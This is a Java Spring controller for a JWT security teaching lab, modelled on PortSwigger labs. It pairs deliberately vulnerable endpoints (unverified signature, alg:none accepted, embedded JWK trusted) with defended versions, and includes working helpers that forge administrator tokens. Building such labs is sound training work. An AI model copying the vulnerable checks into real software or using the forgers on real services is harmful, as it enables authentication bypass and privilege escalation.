package com.theatermgnt.theatermgnt.security.lab;

import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.util.Base64;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.UUID;

import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.JWSSigner;
import com.nimbusds.jose.crypto.RSASSASigner;
import com.nimbusds.jose.crypto.RSASSAVerifier;
import com.nimbusds.jose.jwk.RSAKey;
import com.nimbusds.jwt.JWTClaimsSet;
import com.nimbusds.jwt.SignedJWT;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

/**
 * JWT Security Lab — mô phỏng 3 lỗ hổng từ PortSwigger JWT labs:
 *
 *  Lab 1 (Apprentice) — Unverified signature
 *    VULNERABLE : GET /security-lab/jwt/lab1/whoami
 *    DEFENDED   : GET /security-lab/jwt/defended/lab1/whoami
 *
 *  Lab 2 (Apprentice) — alg:none bypass
 *    VULNERABLE : GET /security-lab/jwt/lab2/whoami
 *    DEFENDED   : GET /security-lab/jwt/defended/lab2/whoami
 *
 *  Lab 4 (Practitioner) — JWK header injection
 *    VULNERABLE : GET /security-lab/jwt/lab4/whoami
 *    DEFENDED   : GET /security-lab/jwt/defended/lab4/whoami
 *
 *  Helper:
 *    GET  /security-lab/jwt/info          — overview của tất cả defenses
 *    POST /security-lab/jwt/forge/lab1    — tạo forged token (sub=administrator) để test lab1/lab2
 *    POST /security-lab/jwt/forge/lab4    — tạo forged token signed bằng RSA key của attacker
 */
@RestController
@RequestMapping("/security-lab/jwt")
@RequiredArgsConstructor
@Slf4j
public class JwtLabController {

    private final JwtLabService jwtLabService;

    // ═══════════════════════════════════════════════════════════════════════
    //  INFO — tổng quan defenses
    // ═══════════════════════════════════════════════════════════════════════

    @GetMapping("/info")
    public ResponseEntity<?> info() {
        Map<String, Object> labs = new LinkedHashMap<>();

        labs.put("lab1", Map.of(
            "title",       "JWT authentication bypass via unverified signature (Apprentice)",
            "attack",      "Thay đổi payload (sub, scope) rồi gửi lại — server không verify chữ ký",
            "vulnerable",  "GET /security-lab/jwt/lab1/whoami",
            "defended",    "GET /security-lab/jwt/defended/lab1/whoami",
            "forge_tool",  "POST /security-lab/jwt/forge/lab1",
            "defense",     "Gọi jwt.verify(verifier) trước khi tin tưởng bất kỳ claim nào"
        ));

        labs.put("lab2", Map.of(
            "title",       "JWT authentication bypass via alg:none (Apprentice)",
            "attack",      "Đổi header alg thành 'none', xóa chữ ký (phần 3 để trống) — server bỏ qua verify",
            "vulnerable",  "GET /security-lab/jwt/lab2/whoami",
            "defended",    "GET /security-lab/jwt/defended/lab2/whoami",
            "forge_tool",  "POST /security-lab/jwt/forge/lab1  (cùng token, đổi alg header thành none)",
            "defense",     "Explicit check: alg == HS512 trước khi verify — từ chối mọi alg khác kể cả 'none'"
        ));

        labs.put("lab4", Map.of(
            "title",       "JWT authentication bypass via JWK header injection (Practitioner)",
            "attack",      "Attacker tạo RSA key pair, embed public key vào JWT header 'jwk', ký bằng private key — server dùng embedded key verify",
            "vulnerable",  "GET /security-lab/jwt/lab4/whoami",
            "defended",    "GET /security-lab/jwt/defended/lab4/whoami",
            "forge_tool",  "POST /security-lab/jwt/forge/lab4",
            "defense",     "Từ chối mọi JWT có header jwk / jku / kid — chỉ dùng server-side key"
        ));

        return ResponseEntity.ok(Map.of(
            "description", "JWT httpOnly Session Security Lab — Cinema Management",
            "note",        "Login tại POST /api/theater-mgnt/auth/customer/login để lấy cookie access_token, sau đó gọi các lab endpoint",
            "labs",        labs
        ));
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  FORGE HELPERS — tạo token giả để demo tấn công
    // ═══════════════════════════════════════════════════════════════════════

    /**
     * Tạo forged token cho Lab 1 và Lab 2:
     * - Lấy token hợp lệ từ cookie, thay sub → "administrator", scope → "ROLE_ADMIN"
     * - Chữ ký cũ không còn hợp lệ (payload thay đổi)
     * - Dùng để demo Lab 1 (server không verify) và Lab 2 (dùng alg:none)
     */
    @PostMapping("/forge/lab1")
    public ResponseEntity<?> forgeTokenLab1(
            @CookieValue(value = "access_token", required = false) String rawToken) {

        if (rawToken == null || rawToken.isBlank()) {
            return ResponseEntity.badRequest().body(Map.of(
                "error", "Cần đăng nhập trước — không có cookie access_token",
                "hint",  "POST /api/theater-mgnt/auth/customer/login"
            ));
        }
        try {
            String token = URLDecoder.decode(rawToken, StandardCharsets.UTF_8);
            String[] parts = token.split("\\.");
            if (parts.length < 3) return ResponseEntity.badRequest().body("Token không hợp lệ");

            // Lấy payload gốc, thay sub + scope
            String origPayloadJson = new String(Base64.getUrlDecoder().decode(parts[1]));
            String forgedPayload = origPayloadJson
                    .replaceAll("\"sub\":\"[^\"]+\"", "\"sub\":\"administrator\"")
                    .replaceAll("\"scope\":\"[^\"]*\"", "\"scope\":\"ROLE_ADMIN\"");

            String encodedForgedPayload = Base64.getUrlEncoder().withoutPadding()
                    .encodeToString(forgedPayload.getBytes(StandardCharsets.UTF_8));

            // ── Forged token Lab 1/2 (chữ ký cũ, payload mới → sig sai)
            String forgedTokenLab1 = parts[0] + "." + encodedForgedPayload + "." + parts[2];

            // ── Forged token Lab 2 (alg:none, không cần chữ ký)
            String noneHeader = Base64.getUrlEncoder().withoutPadding()
                    .encodeToString("{\"alg\":\"none\",\"typ\":\"JWT\"}"
                            .getBytes(StandardCharsets.UTF_8));
            String forgedTokenLab2 = noneHeader + "." + encodedForgedPayload + ".";

            return ResponseEntity.ok(Map.of(
                "original_payload",      origPayloadJson,
                "forged_payload",        forgedPayload,
                "forged_token_lab1",     forgedTokenLab1,
                "forged_token_lab2_none",forgedTokenLab2,
                "instructions", Map.of(
                    "lab1_test", "Đặt cookie access_token = forged_token_lab1 → GET /security-lab/jwt/lab1/whoami vs /defended/lab1/whoami",
                    "lab2_test", "Đặt cookie access_token = forged_token_lab2_none → GET /security-lab/jwt/lab2/whoami vs /defended/lab2/whoami"
                )
            ));
        } catch (Exception e) {
            return ResponseEntity.badRequest().body(Map.of("error", e.getMessage()));
        }
    }

    /**
     * Tạo forged token cho Lab 4 (JWK header injection):
     * - Generate RSA-2048 key pair của "attacker"
     * - Tạo JWT với sub=administrator, ký bằng RSA private key của attacker
     * - Embed RSA public key vào JWT header jwk
     * - Server vulnerable sẽ trust key này và verify thành công
     */
    @PostMapping("/forge/lab4")
    public ResponseEntity<?> forgeTokenLab4() {
        try {
            // Attacker generates their own RSA key pair
            KeyPairGenerator gen = KeyPairGenerator.getInstance("RSA");
            gen.initialize(2048);
            KeyPair keyPair = gen.generateKeyPair();
            RSAPublicKey  rsaPub  = (RSAPublicKey)  keyPair.getPublic();
            RSAPrivateKey rsaPriv = (RSAPrivateKey) keyPair.getPrivate();

            RSAKey attackerJwk = new RSAKey.Builder(rsaPub)
                    .privateKey(rsaPriv)
                    .keyID(UUID.randomUUID().toString())
                    .build();

            // Build JWT với JWK header injection
            JWSHeader header = new JWSHeader.Builder(JWSAlgorithm.RS256)
                    .jwk(attackerJwk.toPublicJWK())  // embed public key vào header
                    .build();

            JWTClaimsSet claims = new JWTClaimsSet.Builder()
                    .issuer("theater-mgnt.com")
                    .subject("administrator")
                    .issueTime(new Date())
                    .expirationTime(new Date(System.currentTimeMillis() + 3_600_000))
                    .jwtID(UUID.randomUUID().toString())
                    .claim("scope", "ROLE_ADMIN")
                    .build();

            SignedJWT signedJWT = new SignedJWT(header, claims);
            JWSSigner signer = new RSASSASigner(rsaPriv);
            signedJWT.sign(signer);

            String forgedToken = signedJWT.serialize();

            // Verify bằng embedded key để confirm attack works
            RSASSAVerifier verifier = new RSASSAVerifier(rsaPub);
            boolean selfVerified = signedJWT.verify(verifier);

            return ResponseEntity.ok(Map.of(
                "forged_token",  forgedToken,
                "self_verified", selfVerified,
                "attacker_key_id", attackerJwk.getKeyID(),
                "claim_sub",     "administrator",
                "claim_scope",   "ROLE_ADMIN",
                "instructions",  Map.of(
                    "lab4_test",    "Đặt cookie access_token = forged_token → GET /security-lab/jwt/lab4/whoami vs /defended/lab4/whoami",
                    "how_it_works", "JWT header chứa 'jwk' với RSA public key của attacker. Server vulnerable dùng key này để verify → thành công vì attacker ký bằng private key tương ứng"
                )
            ));
        } catch (Exception e) {
            return ResponseEntity.status(500).body(Map.of("error", e.getMessage()));
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  LAB 1 — Unverified Signature (Apprentice)
    // ═══════════════════════════════════════════════════════════════════════

    /**
     * VULNERABLE: chỉ base64-decode payload, không gọi verify().
     * Attacker thay sub thành "administrator" → server tin tưởng.
     */
    @GetMapping("/lab1/whoami")
    public ResponseEntity<?> lab1Vulnerable(
            @CookieValue(value = "access_token", required = false) String rawToken) {

        if (rawToken == null || rawToken.isBlank()) {
            return ResponseEntity.status(401).body(Map.of(
                "lab",   "lab1-VULNERABLE",
                "error", "Không có cookie access_token — đăng nhập trước"
            ));
        }
        try {
            String token = URLDecoder.decode(rawToken, StandardCharsets.UTF_8);
            String[] parts = token.split("\\.");
            if (parts.length < 2) {
                return ResponseEntity.badRequest().body("JWT không hợp lệ");
            }

            // ⚠️ VULNERABILITY: chỉ decode payload, KHÔNG verify signature
            String payload = new String(Base64.getUrlDecoder().decode(parts[1]));

            log.warn("[lab1-VULNERABLE] Trả kết quả mà không verify chữ ký!");
            return ResponseEntity.ok(Map.of(
                "lab",             "lab1-VULNERABLE",
                "vulnerability",   "⚠️ Chữ ký KHÔNG được verify — attacker có thể forge bất kỳ sub/scope nào",
                "trusted_payload", payload,
                "attack_success",  payload.contains("administrator")
            ));
        } catch (Exception e) {
            return ResponseEntity.badRequest().body(Map.of("error", e.getMessage()));
        }
    }

    /**
     * DEFENDED: verify chữ ký HS512 trước khi trả kết quả.
     * Forged token bị từ chối vì chữ ký không khớp với server key.
     */
    @GetMapping("/defended/lab1/whoami")
    public ResponseEntity<?> lab1Defended(
            @CookieValue(value = "access_token", required = false) String rawToken) {
        return jwtLabService.verifySignature(rawToken, "lab1-DEFENDED");
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  LAB 2 — alg:none bypass (Apprentice)
    // ═══════════════════════════════════════════════════════════════════════

    /**
     * VULNERABLE: không kiểm tra algorithm, chấp nhận alg:none.
     * Attacker xóa chữ ký, đặt alg=none → server accept.
     */
    @GetMapping("/lab2/whoami")
    public ResponseEntity<?> lab2Vulnerable(
            @CookieValue(value = "access_token", required = false) String rawToken) {

        if (rawToken == null || rawToken.isBlank()) {
            return ResponseEntity.status(401).body(Map.of(
                "lab",   "lab2-VULNERABLE",
                "error", "Không có cookie access_token"
            ));
        }
        try {
            String token = URLDecoder.decode(rawToken, StandardCharsets.UTF_8);
            String[] parts = token.split("\\.");
            if (parts.length < 2) {
                return ResponseEntity.badRequest().body("JWT không hợp lệ");
            }

            String headerJson  = new String(Base64.getUrlDecoder().decode(parts[0]));
            String payloadJson = new String(Base64.getUrlDecoder().decode(parts[1]));

            boolean isNoneAlg = headerJson.toLowerCase().contains("\"none\"");

            // ⚠️ VULNERABILITY: không pin algorithm, không verify — chấp nhận alg:none
            log.warn("[lab2-VULNERABLE] Chấp nhận token với alg: {}", isNoneAlg ? "none" : "unknown");

            return ResponseEntity.ok(Map.of(
                "lab",             "lab2-VULNERABLE",
                "vulnerability",   "⚠️ Algorithm KHÔNG bị pin — alg:none được chấp nhận, không cần chữ ký",
                "header",          headerJson,
                "trusted_payload", payloadJson,
                "alg_none_used",   isNoneAlg,
                "attack_success",  payloadJson.contains("administrator") || isNoneAlg
            ));
        } catch (Exception e) {
            return ResponseEntity.badRequest().body(Map.of("error", e.getMessage()));
        }
    }

    /**
     * DEFENDED: kiểm tra alg == HS512, từ chối alg:none và mọi alg khác.
     */
    @GetMapping("/defended/lab2/whoami")
    public ResponseEntity<?> lab2Defended(
            @CookieValue(value = "access_token", required = false) String rawToken) {
        return jwtLabService.verifyWithAlgorithmPin(rawToken, "lab2-DEFENDED");
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  LAB 4 — JWK Header Injection (Practitioner)
    // ═══════════════════════════════════════════════════════════════════════

    /**
     * VULNERABLE: tin tưởng public key được nhúng trong header "jwk".
     * Attacker tạo RSA key pair, embed public key vào header, ký bằng private key
     * → server verify thành công vì dùng key của attacker.
     */
    @GetMapping("/lab4/whoami")
    public ResponseEntity<?> lab4Vulnerable(
            @CookieValue(value = "access_token", required = false) String rawToken) {

        if (rawToken == null || rawToken.isBlank()) {
            return ResponseEntity.status(401).body(Map.of(
                "lab",   "lab4-VULNERABLE",
                "error", "Không có cookie access_token"
            ));
        }
        try {
            String token = URLDecoder.decode(rawToken, StandardCharsets.UTF_8);
            SignedJWT jwt = SignedJWT.parse(token);

            // ⚠️ VULNERABILITY: sử dụng JWK từ header để verify — attacker kiểm soát key
            com.nimbusds.jose.jwk.JWK embeddedJwk = jwt.getHeader().getJWK();

            if (embeddedJwk instanceof RSAKey rsaKey) {
                RSASSAVerifier verifier = new RSASSAVerifier(rsaKey.toRSAPublicKey());
                boolean verified = jwt.verify(verifier);

                if (verified) {
                    log.warn("[lab4-VULNERABLE] JWK injection attack SUCCEEDED — server dùng key của attacker!");
                    return ResponseEntity.ok(Map.of(
                        "lab",             "lab4-VULNERABLE",
                        "vulnerability",   "⚠️ JWK header injection: server dùng public key của ATTACKER để verify",
                        "embedded_key_id", rsaKey.getKeyID() != null ? rsaKey.getKeyID() : "no-kid",
                        "trusted_payload", jwt.getJWTClaimsSet().toString(),
                        "attack_success",  true
                    ));
                }
            }

            // Không có JWK → fallback: decode không verify (cũng vulnerable)
            String[] parts = token.split("\\.");
            String payload = new String(Base64.getUrlDecoder().decode(parts[1]));
            return ResponseEntity.ok(Map.of(
                "lab",             "lab4-VULNERABLE",
                "vulnerability",   "⚠️ Không có JWK header nhưng payload vẫn được trả (unverified)",
                "trusted_payload", payload,
                "attack_success",  false
            ));

        } catch (Exception e) {
            return ResponseEntity.badRequest().body(Map.of("error", e.getMessage()));
        }
    }

    /**
     * DEFENDED: từ chối mọi JWT có header jwk / jku / kid.
     * Chỉ dùng server-side HMAC key để verify.
     */
    @GetMapping("/defended/lab4/whoami")
    public ResponseEntity<?> lab4Defended(
            @CookieValue(value = "access_token", required = false) String rawToken) {
        return jwtLabService.verifyRejectingHeaders(rawToken, "lab4-DEFENDED");
    }
}
